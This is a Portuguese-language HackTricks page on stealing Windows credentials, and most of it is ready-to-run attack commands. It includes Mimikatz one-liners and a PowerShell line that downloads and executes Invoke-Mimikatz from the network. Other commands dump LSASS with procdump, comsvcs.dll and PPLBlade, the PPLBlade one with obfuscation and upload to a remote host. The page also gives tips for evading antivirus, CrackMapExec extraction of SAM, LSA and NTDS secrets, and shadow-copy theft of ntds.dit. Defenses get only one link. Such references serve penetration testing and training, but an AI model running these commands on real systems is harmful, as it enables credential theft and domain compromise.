# Stealing Windows Credentials

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras coisas que o Mimikatz pode fazer em** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba mais sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Plugin de Credenciais**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar por senhas e hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Como **Procdump do** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
Você pode usar esta ferramenta para **extrair o processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extrair credenciais do dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe para despejar lsass.exe**, isso ocorre porque eles estão **detectando** a string **"procdump.exe" e "lsass.exe"**. Portanto, é **mais discreto** passar como um **argumento** o **PID** de lsass.exe para procdump **em vez de** usar o **nome lsass.exe.**

### Despejando lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **despejar a memória do processo** em caso de falha. Esta DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser despejado constitui o primeiro componente, o local do arquivo de despejo representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
Ao analisar esses três componentes, a DLL é acionada para criar o arquivo de despejo e transferir a memória do processo especificado para este arquivo.\
A utilização da **comsvcs.dll** é viável para despejar o processo lsass, eliminando assim a necessidade de fazer upload e executar o procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

O seguinte comando é empregado para execução:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito na Barra de Tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Local Security Authority Process" na aba Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Criar arquivo de despejo".

### Dumping lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte do conjunto [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de despejo de processo protegido que suporta a ofuscação de despejos de memória e a transferência em estações de trabalho remotas sem gravá-los no disco.

**Funcionalidades principais**:

1. Contornar a proteção PPL
2. Ofuscar arquivos de despejo de memória para evadir mecanismos de detecção baseados em assinatura do Defender
3. Fazer upload de despejos de memória com métodos de upload RAW e SMB sem gravá-los no disco (despejo sem arquivo)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Extrair hashes do SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extrair segredos LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Despeje o NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extrair o histórico de senhas do NTDS.dit do DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostre o atributo pwdLastSet para cada conta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode apenas copiá-los de uma maneira regular** porque estão protegidos.

### From Registry

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode realizar cópias de arquivos protegidos usando este serviço. Você precisa ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo a partir do **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e está salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Finalmente, você também pode usar o [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, contendo dados cruciais sobre objetos de usuário, grupos e suas associações. É onde os **hashes de senha** para usuários de domínio são armazenados. Este arquivo é um banco de dados **Extensible Storage Engine (ESE)** e reside em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro deste banco de dados, três tabelas principais são mantidas:

- **Tabela de Dados**: Esta tabela é responsável por armazenar detalhes sobre objetos como usuários e grupos.
- **Tabela de Links**: Ela rastreia relacionamentos, como associações de grupos.
- **Tabela SD**: **Descritores de segurança** para cada objeto são mantidos aqui, garantindo a segurança e o controle de acesso para os objetos armazenados.

Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é utilizado por _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho ao usar um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografar a Chave de Criptografia de Senha (**PEK**) usando a **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **cada controlador de domínio**, mas é **cifrado** dentro do arquivo **NTDS.dit** usando a **BOOTKEY** do **arquivo SYSTEM do controlador de domínio (é diferente entre controladores de domínio)**. É por isso que, para obter as credenciais do arquivo NTDS.dit, **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque de [**cópia de sombra de volume**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**extraia-o do registro ou use o truque de cópia de sombra de volume**](./#stealing-sam-and-system)).

### **Extraindo hashes do NTDS.dit**

Uma vez que você tenha **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extrair eles automaticamente** usando um usuário administrador de domínio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **grandes arquivos NTDS.dit**, é recomendável extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o **módulo metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também todos os objetos e seus atributos para extração de informações adicionais quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (hashes NT e LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senhas NT e LM). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e de máquina com seus hashes, flags UAC, timestamp do último logon e mudança de senha, descrição das contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associação, domínios confiáveis com tipo de confiança, direção e atributos...

## Lazagne

Baixe o binário [aqui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar este binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraia credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Baixe de: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e apenas **execute-o** e as senhas serão extraídas.

## Defesas

[**Saiba mais sobre algumas proteções de credenciais aqui.**](credentials-protections.md)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
